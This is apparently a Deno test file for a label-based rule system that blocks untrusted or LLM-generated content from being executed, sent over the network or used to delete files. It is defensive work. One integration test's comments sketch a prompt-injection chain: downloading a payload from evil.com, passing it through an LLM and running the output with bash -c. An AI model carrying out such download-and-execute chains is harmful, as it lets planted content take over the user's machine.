/**
 * Exchange Rule System Tests
 *
 * Tests exchange rule evaluation, intent management, and audit logging.
 */

import { assertEquals, assertExists } from "@std/assert";
import {
  atomMatchesAny,
  atomMatchesMatcher,
  ExchangeRuleEvaluator,
} from "../src/exchange.ts";
import { IntentManager } from "../src/intent.ts";
import { AuditLog } from "../src/audit.ts";
import { defaultRules } from "../src/rules/default.ts";
import { Atom, Label, labels } from "../src/labels.ts";

// ============================================================================
// Helper Functions
// ============================================================================

function makeLabel(integrity: Atom[], confidentiality: Atom[][] = []): Label {
  return {
    integrity,
    confidentiality,
  };
}

// ============================================================================
// Atom Matcher Tests
// ============================================================================

Deno.test("atomMatchesMatcher - matches by kind only", () => {
  const atom: Atom = { kind: "UserInput" };
  const matcher = { kind: "UserInput" as const };

  assertEquals(atomMatchesMatcher(atom, matcher), true);
});

Deno.test("atomMatchesMatcher - matches by kind and params", () => {
  const atom: Atom = { kind: "EndorsedBy", principal: "alice" };
  const matcher = {
    kind: "EndorsedBy" as const,
    params: { principal: "alice" },
  };

  assertEquals(atomMatchesMatcher(atom, matcher), true);
});

Deno.test("atomMatchesMatcher - does not match different kind", () => {
  const atom: Atom = { kind: "UserInput" };
  const matcher = { kind: "LLMGenerated" as const };

  assertEquals(atomMatchesMatcher(atom, matcher), false);
});

Deno.test("atomMatchesMatcher - does not match different params", () => {
  const atom: Atom = { kind: "EndorsedBy", principal: "alice" };
  const matcher = { kind: "EndorsedBy" as const, params: { principal: "bob" } };

  assertEquals(atomMatchesMatcher(atom, matcher), false);
});

Deno.test("atomMatchesAny - matches at least one", () => {
  const label = makeLabel([
    { kind: "Origin", url: "https://evil.com" },
  ]);

  const matchers = [
    { kind: "UserInput" as const },
    { kind: "EndorsedBy" as const },
  ];

  assertEquals(atomMatchesAny(label, matchers), false);

  const label2 = makeLabel([
    { kind: "UserInput" },
  ]);

  assertEquals(atomMatchesAny(label2, matchers), true);
});

// ============================================================================
// Exec Integrity Gate Tests
// ============================================================================

Deno.test("Exec rule blocks content with only Origin integrity", () => {
  const evaluator = new ExchangeRuleEvaluator();
  evaluator.addRules(defaultRules);

  const dataLabel = makeLabel([
    { kind: "Origin", url: "https://evil.com" },
  ]);
  const pcLabel = labels.userInput();

  const verdict = evaluator.evaluate("bash", "exec", dataLabel, pcLabel);

  assertEquals(verdict.allowed, false);
  assertEquals(verdict.action, "block");
  assertExists(verdict.reason);
});

Deno.test("Exec rule blocks content with only LLMGenerated integrity", () => {
  const evaluator = new ExchangeRuleEvaluator();
  evaluator.addRules(defaultRules);

  const dataLabel = makeLabel([
    { kind: "LLMGenerated", model: "gpt-4" },
  ]);
  const pcLabel = labels.userInput();

  const verdict = evaluator.evaluate("bash", "exec", dataLabel, pcLabel);

  assertEquals(verdict.allowed, false);
  assertEquals(verdict.action, "block");
});

Deno.test("Exec rule allows content with UserInput integrity", () => {
  const evaluator = new ExchangeRuleEvaluator();
  evaluator.addRules(defaultRules);

  const dataLabel = labels.userInput();
  const pcLabel = labels.userInput();

  const verdict = evaluator.evaluate("bash", "exec", dataLabel, pcLabel);

  assertEquals(verdict.allowed, true);
});

Deno.test("Exec rule allows content with EndorsedBy integrity", () => {
  const evaluator = new ExchangeRuleEvaluator();
  evaluator.addRules(defaultRules);

  const dataLabel = makeLabel([
    { kind: "EndorsedBy", principal: "user" },
  ]);
  const pcLabel = labels.userInput();

  const verdict = evaluator.evaluate("bash", "exec", dataLabel, pcLabel);

  assertEquals(verdict.allowed, true);
});

Deno.test("Exec rule allows content with CodeHash integrity", () => {
  const evaluator = new ExchangeRuleEvaluator();
  evaluator.addRules(defaultRules);

  const dataLabel = makeLabel([
    { kind: "CodeHash", hash: "sha256:abc123" },
  ]);
  const pcLabel = labels.userInput();

  const verdict = evaluator.evaluate("python", "exec", dataLabel, pcLabel);

  assertEquals(verdict.allowed, true);
});

// ============================================================================
// Network Egress Gate Tests
// ============================================================================

Deno.test("Network egress blocks data with Space confidentiality", () => {
  const evaluator = new ExchangeRuleEvaluator();
  evaluator.addRules(defaultRules);

  const dataLabel: Label = {
    confidentiality: [[{ kind: "Space", id: "private-space" }]],
    integrity: [],
  };
  const pcLabel = labels.userInput();

  const verdict = evaluator.evaluate(
    "curl",
    "network-egress",
    dataLabel,
    pcLabel,
  );

  assertEquals(verdict.allowed, false);
  assertEquals(verdict.action, "block");
  assertExists(verdict.reason);
});

Deno.test("Network egress allows public data", () => {
  const evaluator = new ExchangeRuleEvaluator();
  evaluator.addRules(defaultRules);

  const dataLabel = makeLabel([]); // Public, no confidentiality
  const pcLabel = labels.userInput();

  const verdict = evaluator.evaluate(
    "curl",
    "network-egress",
    dataLabel,
    pcLabel,
  );

  assertEquals(verdict.allowed, true);
});

// ============================================================================
// Destructive Write Intent Gate Tests
// ============================================================================

Deno.test("Destructive write requests intent", () => {
  const evaluator = new ExchangeRuleEvaluator();
  evaluator.addRules(defaultRules);

  const dataLabel = labels.userInput();
  const pcLabel = labels.userInput();

  const verdict = evaluator.evaluate(
    "rm",
    "destructive-write",
    dataLabel,
    pcLabel,
  );

  assertEquals(verdict.allowed, false);
  assertEquals(verdict.action, "request-intent");
  assertExists(verdict.rule);
  assertEquals(verdict.rule.name, "destructive-write-intent-gate");
});

// ============================================================================
// Environment Mutation Gate Tests
// ============================================================================

Deno.test("Environment mutation blocks when PC has no UserInput integrity", () => {
  const evaluator = new ExchangeRuleEvaluator();
  evaluator.addRules(defaultRules);

  const dataLabel = labels.userInput();
  const pcLabel = makeLabel([
    { kind: "Origin", url: "https://evil.com" },
  ]);

  const verdict = evaluator.evaluate(
    "export",
    "env-mutation",
    dataLabel,
    pcLabel,
  );

  assertEquals(verdict.allowed, false);
  assertEquals(verdict.action, "block");
});

Deno.test("Environment mutation allows when PC has UserInput integrity", () => {
  const evaluator = new ExchangeRuleEvaluator();
  evaluator.addRules(defaultRules);

  const dataLabel = labels.userInput();
  const pcLabel = labels.userInput();

  const verdict = evaluator.evaluate(
    "export",
    "env-mutation",
    dataLabel,
    pcLabel,
  );

  assertEquals(verdict.allowed, true);
});

// ============================================================================
// Intent Manager Tests
// ============================================================================

Deno.test("Intent creation and single-use consumption", () => {
  const manager = new IntentManager();

  const intent = manager.create("rm", "rm -rf /tmp/test", "delete /tmp/test");

  assertExists(intent.id);
  assertEquals(intent.action, "rm");
  assertEquals(intent.consumed, false);

  // First consumption succeeds
  assertEquals(manager.consume(intent.id), true);
  assertEquals(manager.isValid(intent.id), false);

  // Second consumption fails
  assertEquals(manager.consume(intent.id), false);
});

Deno.test("Intent expiration", async () => {
  const manager = new IntentManager({ ttl: 100 }); // 100ms TTL

  const intent = manager.create("rm", "rm file.txt", "delete file.txt");

  assertEquals(manager.isValid(intent.id), true);

  // Wait for expiration
  await new Promise((resolve) => setTimeout(resolve, 150));

  assertEquals(manager.isValid(intent.id), false);
  assertEquals(manager.consume(intent.id), false);
});

Deno.test("Intent scope checking", () => {
  const manager = new IntentManager();

  const intent = manager.create("rm", "rm file.txt", "delete file.txt");

  assertEquals(intent.scope, "delete file.txt");

  // In a real implementation, we'd check that the scope matches the operation
  // For now, we just verify the scope is stored correctly
});

Deno.test("Intent garbage collection", async () => {
  const manager = new IntentManager({ ttl: 50 });

  const intent1 = manager.create("rm", "rm file1.txt", "delete file1.txt");
  const intent2 = manager.create("rm", "rm file2.txt", "delete file2.txt");

  assertEquals(manager.active().length, 2);

  // Wait for expiration
  await new Promise((resolve) => setTimeout(resolve, 100));

  // Before GC, expired intents still exist
  assertEquals(manager.get(intent1.id), intent1);

  // Run GC
  manager.gc();

  // After GC, expired intents are removed
  assertEquals(manager.get(intent1.id), null);
  assertEquals(manager.get(intent2.id), null);
  assertEquals(manager.active().length, 0);
});

Deno.test("Intent active list", () => {
  const manager = new IntentManager();

  const intent1 = manager.create("rm", "rm file1.txt", "delete file1.txt");
  const intent2 = manager.create("rm", "rm file2.txt", "delete file2.txt");

  assertEquals(manager.active().length, 2);

  // Consume one
  manager.consume(intent1.id);

  assertEquals(manager.active().length, 1);
  assertEquals(manager.active()[0].id, intent2.id);
});

// ============================================================================
// Audit Log Tests
// ============================================================================

Deno.test("Audit log records all evaluations", () => {
  const log = new AuditLog();

  const entry = {
    timestamp: Date.now(),
    command: "bash",
    args: ["-c", "echo hello"],
    inputLabels: [labels.userInput()],
    outputLabel: labels.userInput(),
    pcLabel: labels.userInput(),
    verdict: "allowed" as const,
  };

  log.log(entry);

  assertEquals(log.all().length, 1);
  assertEquals(log.all()[0], entry);
});

Deno.test("Audit log forCommand filter", () => {
  const log = new AuditLog();

  log.log({
    timestamp: Date.now(),
    command: "bash",
    args: ["-c", "echo hello"],
    inputLabels: [],
    outputLabel: labels.bottom(),
    pcLabel: labels.bottom(),
    verdict: "allowed",
  });

  log.log({
    timestamp: Date.now(),
    command: "rm",
    args: ["file.txt"],
    inputLabels: [],
    outputLabel: labels.bottom(),
    pcLabel: labels.bottom(),
    verdict: "intent-requested",
  });

  assertEquals(log.forCommand("bash").length, 1);
  assertEquals(log.forCommand("rm").length, 1);
  assertEquals(log.forCommand("curl").length, 0);
});

Deno.test("Audit log blocked filter", () => {
  const log = new AuditLog();

  log.log({
    timestamp: Date.now(),
    command: "bash",
    args: ["-c", "malicious"],
    inputLabels: [makeLabel([{ kind: "Origin", url: "https://evil.com" }])],
    outputLabel: labels.bottom(),
    pcLabel: labels.bottom(),
    verdict: "blocked",
    rule: "exec-integrity-gate",
    reason: "Data lacks required integrity atoms",
  });

  log.log({
    timestamp: Date.now(),
    command: "echo",
    args: ["hello"],
    inputLabels: [],
    outputLabel: labels.bottom(),
    pcLabel: labels.bottom(),
    verdict: "allowed",
  });

  const blocked = log.blocked();
  assertEquals(blocked.length, 1);
  assertEquals(blocked[0].command, "bash");
});

Deno.test("Audit log since filter", () => {
  const log = new AuditLog();

  const timestamp1 = Date.now();

  log.log({
    timestamp: timestamp1,
    command: "echo",
    args: ["1"],
    inputLabels: [],
    outputLabel: labels.bottom(),
    pcLabel: labels.bottom(),
    verdict: "allowed",
  });

  const timestamp2 = timestamp1 + 1000;

  log.log({
    timestamp: timestamp2,
    command: "echo",
    args: ["2"],
    inputLabels: [],
    outputLabel: labels.bottom(),
    pcLabel: labels.bottom(),
    verdict: "allowed",
  });

  assertEquals(log.since(timestamp1).length, 2);
  assertEquals(log.since(timestamp2).length, 1);
  assertEquals(log.since(timestamp2 + 1).length, 0);
});

Deno.test("Audit log format", () => {
  const log = new AuditLog();

  const entry = {
    timestamp: Date.now(),
    command: "bash",
    args: ["-c", "malicious"],
    inputLabels: [makeLabel([{ kind: "Origin", url: "https://evil.com" }])],
    outputLabel: labels.bottom(),
    pcLabel: labels.userInput(),
    verdict: "blocked" as const,
    rule: "exec-integrity-gate",
    reason: "Data lacks required integrity atoms",
  };

  const formatted = log.format(entry);

  // Check that formatted string contains key information
  assertEquals(formatted.includes("bash"), true);
  assertEquals(formatted.includes("blocked"), true);
  assertEquals(formatted.includes("exec-integrity-gate"), true);
  assertEquals(formatted.includes("Data lacks required integrity atoms"), true);
});

Deno.test("Audit log clear", () => {
  const log = new AuditLog();

  log.log({
    timestamp: Date.now(),
    command: "echo",
    args: ["hello"],
    inputLabels: [],
    outputLabel: labels.bottom(),
    pcLabel: labels.bottom(),
    verdict: "allowed",
  });

  assertEquals(log.all().length, 1);

  log.clear();

  assertEquals(log.all().length, 0);
});

// ============================================================================
// Multiple Rules Priority Tests
// ============================================================================

Deno.test("Multiple rules: first matching rule by priority", () => {
  const evaluator = new ExchangeRuleEvaluator();

  // Add rules in reverse priority order to test sorting
  evaluator.addRule({
    name: "low-priority",
    match: { commands: ["test"] },
    onViolation: "warn",
    description: "Low priority rule",
    priority: 100,
  });

  evaluator.addRule({
    name: "high-priority",
    match: { commands: ["test"] },
    onViolation: "block",
    description: "High priority rule",
    priority: 10,
  });

  const verdict = evaluator.evaluate(
    "test",
    undefined,
    labels.bottom(),
    labels.bottom(),
  );

  // High priority rule (lower number) should match first
  assertEquals(verdict.rule?.name, "high-priority");
});

Deno.test("Rule with requirements passes when met", () => {
  const evaluator = new ExchangeRuleEvaluator();

  evaluator.addRule({
    name: "test-rule",
    match: { commands: ["test"] },
    requires: {
      integrity: [{ kind: "UserInput" }],
    },
    onViolation: "block",
    description: "Test rule",
    priority: 10,
  });

  const dataLabel = labels.userInput();
  const verdict = evaluator.evaluate(
    "test",
    undefined,
    dataLabel,
    labels.bottom(),
  );

  assertEquals(verdict.allowed, true);
  assertEquals(verdict.rule?.name, "test-rule");
});

Deno.test("Rule with requirements fails when not met", () => {
  const evaluator = new ExchangeRuleEvaluator();

  evaluator.addRule({
    name: "test-rule",
    match: { commands: ["test"] },
    requires: {
      integrity: [{ kind: "UserInput" }],
    },
    onViolation: "block",
    description: "Test rule",
    priority: 10,
  });

  const dataLabel = makeLabel([{ kind: "Origin", url: "https://evil.com" }]);
  const verdict = evaluator.evaluate(
    "test",
    undefined,
    dataLabel,
    labels.bottom(),
  );

  assertEquals(verdict.allowed, false);
  assertEquals(verdict.action, "block");
});

// ============================================================================
// Integration Test: Full Flow
// ============================================================================

Deno.test("Integration: Prompt injection defense", () => {
  const evaluator = new ExchangeRuleEvaluator();
  evaluator.addRules(defaultRules);

  const log = new AuditLog();

  // Simulate: curl -o data.txt https://evil.com/payload
  const downloadedData = labels.fromNetwork("https://evil.com/payload", true);

  // Simulate: cat data.txt | llm_process
  // LLM output inherits the low integrity from downloaded data
  const llmOutput = labels.join(downloadedData, labels.llmGenerated("gpt-4"));

  // Simulate: bash -c "$llm_output"
  const verdict = evaluator.evaluate(
    "bash",
    "exec",
    llmOutput,
    labels.userInput(),
  );

  // Should be blocked!
  assertEquals(verdict.allowed, false);
  assertEquals(verdict.action, "block");

  // Log the event
  log.log({
    timestamp: Date.now(),
    command: "bash",
    args: ["-c", "$llm_output"],
    inputLabels: [llmOutput],
    outputLabel: labels.bottom(),
    pcLabel: labels.userInput(),
    verdict: "blocked",
    rule: verdict.rule?.name,
    reason: verdict.reason,
  });

  assertEquals(log.blocked().length, 1);
});
